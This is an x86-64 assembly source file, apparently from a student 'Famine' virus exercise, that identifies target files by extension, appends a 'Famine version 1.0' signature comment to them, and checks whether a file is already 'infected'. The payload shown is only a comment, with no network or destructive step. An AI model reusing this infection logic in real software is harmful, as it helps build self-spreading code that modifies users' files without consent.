; **************************************************************************** ;
;                                                                              ;
;    handlers.asm                                         :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/15 08:21:18 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/15 08:21:18 by sdestann         ###   ########.fr        ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

extern current_file
extern signature
extern sig_len

global detect_file_type
global infect_text_file
global check_text_infected

section .data
    ; Extensions supportées
    ext_c:      db ".c", 0
    ext_sh:     db ".sh", 0
    ext_py:     db ".py", 0
    ext_txt:    db ".txt", 0
    ext_js:     db ".js", 0
    ext_php:    db ".php", 0
    
    ; Signatures de commentaires par type
    comment_c:      db "/* Famine version 1.0 (c)oded by vfuster- and sdestann */", 10
    comment_c_end:
    db 0
    comment_c_len:  equ comment_c_end - comment_c
    
    comment_sh:     db "# Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_sh_end:
    db 0
    comment_sh_len: equ comment_sh_end - comment_sh
    
    comment_py:     db "# Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_py_end:
    db 0
    comment_py_len: equ comment_py_end - comment_py
    
    comment_txt:    db "# Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_txt_end:
    db 0
    comment_txt_len: equ comment_txt_end - comment_txt
    
    comment_js:     db "// Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_js_end:
    db 0
    comment_js_len: equ comment_js_end - comment_js
    
    comment_php:    db "// Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_php_end:
    db 0
    comment_php_len: equ comment_php_end - comment_php
    
    

section .text

; =============================================================================
; detect_file_type: Détecte le type de fichier basé sur l'extension
; Params: rdi = pointeur vers le nom de fichier
; Returns: rax = type (0=unknown, 1=c, 2=sh, 3=py, 4=txt, 5=js, 6=php)
; Side effects: aucun
; =============================================================================
detect_file_type:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rbx, rdi
    
    
    mov rdi, rbx
    call find_last_dot
    test rax, rax
    jz .unknown
    
    mov r12, rax  ; Sauvegarder l'extension dans r12
    
    
    ; Comparer avec les extensions connues
    mov rdi, r12
    mov rsi, ext_c
    call strcmp_lower
    test rax, rax
    jz .type_c
    
    mov rdi, r12
    mov rsi, ext_sh
    call strcmp_lower
    test rax, rax
    jz .type_sh
    
    mov rdi, r12
    mov rsi, ext_py
    call strcmp_lower
    test rax, rax
    jz .type_py
    
    mov rdi, r12
    mov rsi, ext_txt
    call strcmp_lower
    test rax, rax
    jz .type_txt
    
    mov rdi, r12
    mov rsi, ext_js
    call strcmp_lower
    test rax, rax
    jz .type_js
    
    mov rdi, r12
    mov rsi, ext_php
    call strcmp_lower
    test rax, rax
    jz .type_php
    
.unknown:
    xor rax, rax
    jmp .done

.type_c:
    mov rax, 1
    jmp .done
.type_sh:
    mov rax, 2
    jmp .done
.type_py:
    mov rax, 3
    jmp .done
.type_txt:
    mov rax, 4
    jmp .done
.type_js:
    mov rax, 5
    jmp .done
.type_php:
    mov rax, 6
    
.done:
    ; DEBUG: Afficher le type détecté AVANT de retourner
    push rax  ; SAUVEGARDER LE TYPE
    
    mov r12, rax  ; Sauvegarder dans r12 aussi
    add rax, '0'  ; Convertir en caractère ASCII
    mov [rsp-8], al  ; Stocker sur la pile
    
    mov rdi, 1
    mov rsi, debug_type_detected_msg
    mov rdx, debug_type_detected_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    lea rsi, [rsp-8]
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    pop rax  ; RESTAURER LE TYPE
    
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; find_last_dot: Trouve le dernier point dans une chaîne
; Params: rdi = pointeur vers la chaîne
; Returns: rax = pointeur vers le dernier point (0 si pas trouvé)
; Side effects: aucun
; =============================================================================
find_last_dot:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rbx, rdi
    test rbx, rbx
    jz .not_found
    
    
    mov rdi, rbx
    call strlen
    mov r12, rax  ; Sauvegarder la longueur
    test rax, rax
    jz .not_found
    
    ; DEBUG: Log de la longueur
    push r12
    mov rdi, 1
    mov rsi, debug_find_dot_length_msg
    mov rdx, debug_find_dot_length_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rax, r12
    cmp rax, 10
    jge .length_ok
    add rax, '0'
    mov [rsp-8], al
    mov rdi, 1
    lea rsi, [rsp-8]
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    jmp .length_done
.length_ok:
    mov rdi, 1
    mov rsi, debug_length_long_msg
    mov rdx, debug_length_long_msg_len
    mov rax, SYS_WRITE
    syscall
.length_done:
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    pop r12
    
    lea rdi, [rbx + r12 - 1]
    
.loop:
    cmp rdi, rbx
    jb .not_found
    mov al, byte [rdi]
    cmp al, '.'
    je .found
    dec rdi
    jmp .loop

.found:
    ; DEBUG: Log du point trouvé
    push rdi
    mov rdi, 1
    mov rsi, debug_find_dot_found_msg
    mov rdx, debug_find_dot_found_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax
    
    pop r12
    pop rbx
    pop rbp
    ret

.not_found:
    push rbx
    mov rdi, 1
    mov rsi, debug_find_dot_not_found_msg
    mov rdx, debug_find_dot_not_found_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rbx
    
    xor rax, rax
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; strcmp_lower: Compare deux chaînes en ignorant la casse
; Params: rdi = str1, rsi = str2
; Returns: rax = 0 si égales, non-zero sinon
; Side effects: aucun
; =============================================================================
strcmp_lower:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
.loop:
    movzx r12, byte [rdi]
    movzx r13, byte [rsi]
    
    ; Convertir en minuscule
    cmp r12, 'A'
    jl .check_r13
    cmp r12, 'Z'
    jg .check_r13
    add r12, 32
.check_r13:
    cmp r13, 'A'
    jl .compare
    cmp r13, 'Z'
    jg .compare
    add r13, 32

.compare:
    cmp r12, r13
    jne .not_equal
    
    test r12, r12
    jz .equal
    
    inc rdi
    inc rsi
    jmp .loop

.equal:
    xor rax, rax
    jmp .done

.not_equal:
    mov rax, 1

.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; strlen: Calcule la longueur d'une chaîne
; Params: rdi = pointeur vers la chaîne
; Returns: rax = longueur
; Side effects: aucun
; =============================================================================
strlen:
    push rbp
    mov rbp, rsp
    push rcx
    
    xor rcx, rcx
    
.loop:
    cmp byte [rdi + rcx], 0
    je .done
    inc rcx
    jmp .loop

.done:
    mov rax, rcx
    pop rcx
    pop rbp
    ret

; =============================================================================
; infect_text_file: Infecte un fichier texte avec un commentaire
; Params: rax = type de fichier (1=c, 2=sh, 3=py, 4=txt, 5=js, 6=php)
; Returns: rax = 1 si succès, 0 si échec
; Side effects: modifie le fichier
; =============================================================================
infect_text_file:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    
    mov r12, rax  ; Sauvegarder le type AVANT le debug !
    
    ; DEBUG: Log du type reçu
    mov rdi, 1
    mov rsi, debug_infect_type_msg
    mov rdx, debug_infect_type_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Sélectionner le commentaire approprié
    cmp r12, 1
    je .use_c_comment
    cmp r12, 2
    je .use_sh_comment
    cmp r12, 3
    je .use_py_comment
    cmp r12, 4
    je .use_txt_comment
    cmp r12, 5
    je .use_js_comment
    cmp r12, 6
    je .use_php_comment
    
    ; DEBUG: Log type inconnu
    mov rdi, 1
    mov rsi, debug_infect_unknown_type_msg
    mov rdx, debug_infect_unknown_type_msg_len
    mov rax, SYS_WRITE
    syscall
    jmp .error

.use_c_comment:
    mov r13, comment_c
    mov r14, comment_c_len
    jmp .append_comment

.use_sh_comment:
    mov r13, comment_sh
    mov r14, comment_sh_len
    jmp .append_comment

.use_py_comment:
    mov r13, comment_py
    mov r14, comment_py_len
    jmp .append_comment

.use_txt_comment:
    mov r13, comment_txt
    mov r14, comment_txt_len
    jmp .append_comment

.use_js_comment:
    mov r13, comment_js
    mov r14, comment_js_len
    jmp .append_comment

.use_php_comment:
    mov r13, comment_php
    mov r14, comment_php_len
    jmp .append_comment

.append_comment:
    ; DEBUG: Log avant lseek
    push rdi
    push rsi
    push rdx
    mov rdi, 1
    mov rsi, debug_infect_lseek_msg
    mov rdx, debug_infect_lseek_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rdx
    pop rsi
    pop rdi
    
    ; Aller à la fin du fichier
    movsxd rdi, dword [current_file + file_info.fd]
    xor rsi, rsi
    mov rdx, 2    ; SEEK_END
    mov rax, SYS_LSEEK
    syscall
    
    ; DEBUG: Log avant write
    push rdi
    push rsi
    push rdx
    mov rdi, 1
    mov rsi, debug_infect_write_msg
    mov rdx, debug_infect_write_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rdx
    pop rsi
    pop rdi
    
    ; Écrire le commentaire
    movsxd rdi, dword [current_file + file_info.fd]
    mov rsi, r13
    mov rdx, r14
    mov rax, SYS_WRITE
    syscall
    
    ; DEBUG: Log du résultat de write
    push rax
    push rdi
    push rsi
    push rdx
    mov rdi, 1
    mov rsi, debug_infect_write_result_msg
    mov rdx, debug_infect_write_result_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rdx
    pop rsi
    pop rdi
    pop rax
    
    cmp rax, 0
    jl .error
    
    ; Mettre à jour la taille
    add [current_file + file_info.size], r14
    
    mov rax, 1
    jmp .done

.error:
    xor rax, rax

.done:
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; check_text_infected: Vérifie si un fichier texte est déjà infecté
; Params: rax = type de fichier
; Returns: rax = 1 si infecté, 0 sinon
; Side effects: aucun
; =============================================================================
check_text_infected:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    ; Sélectionner la signature à chercher
    cmp rax, 1
    je .search_c_comment
    cmp rax, 2
    je .search_sh_comment
    cmp rax, 3
    je .search_py_comment
    cmp rax, 4
    je .search_txt_comment
    cmp rax, 5
    je .search_js_comment
    cmp rax, 6
    je .search_php_comment
    jmp .not_infected

.search_c_comment:
    mov rsi, comment_c
    mov rcx, comment_c_len
    jmp .search

.search_sh_comment:
    mov rsi, comment_sh
    mov rcx, comment_sh_len
    jmp .search

.search_py_comment:
    mov rsi, comment_py
    mov rcx, comment_py_len
    jmp .search

.search_txt_comment:
    mov rsi, comment_txt
    mov rcx, comment_txt_len
    jmp .search

.search_js_comment:
    mov rsi, comment_js
    mov rcx, comment_js_len
    jmp .search

.search_php_comment:
    mov rsi, comment_php
    mov rcx, comment_php_len
    jmp .search

.search:
    ; Récupérer l'adresse mappée et la taille
    mov rdi, [current_file + file_info.mapped_addr]
    mov r12, [current_file + file_info.size]
    
    ; Chercher la signature dans le fichier
    call memstr_search
    test rax, rax
    jnz .infected

.not_infected:
    xor rax, rax
    jmp .done

.infected:
    mov rax, 1

.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; memstr_search: Recherche une sous-chaîne dans une chaîne
; Params: rdi = haystack, r12 = haystack_len, rsi = needle, rcx = needle_len
; Returns: rax = pointeur vers la première occurrence (0 si pas trouvé)
; Side effects: aucun
; =============================================================================
memstr_search:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    mov r13, rdi
    mov r14, r12
    mov r15, rsi
    mov rbx, rcx
    
    cmp rbx, r14
    jg .not_found
    
    sub r14, rbx
    inc r14
    
    xor r12, r12

.search_loop:
    cmp r12, r14
    jge .not_found
    
    mov rdi, r13
    add rdi, r12
    mov rsi, r15
    mov rcx, rbx
    call memcmp
    
    test rax, rax
    jz .found
    
    inc r12
    jmp .search_loop

.found:
    lea rax, [r13 + r12]
    jmp .done

.not_found:
    xor rax, rax

.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; memcmp: Compare deux zones mémoire
; Params: rdi = addr1, rsi = addr2, rcx = length
; Returns: rax = 0 si identiques, non-zero sinon
; Side effects: aucun
; =============================================================================
memcmp:
    push rbp
    mov rbp, rsp
    push rcx
    
.loop:
    test rcx, rcx
    jz .equal
    
    movzx rax, byte [rdi]
    movzx rdx, byte [rsi]
    sub rax, rdx
    jnz .done
    
    inc rdi
    inc rsi
    dec rcx
    jmp .loop

.equal:
    xor rax, rax

.done:
    pop rcx
    pop rbp
    ret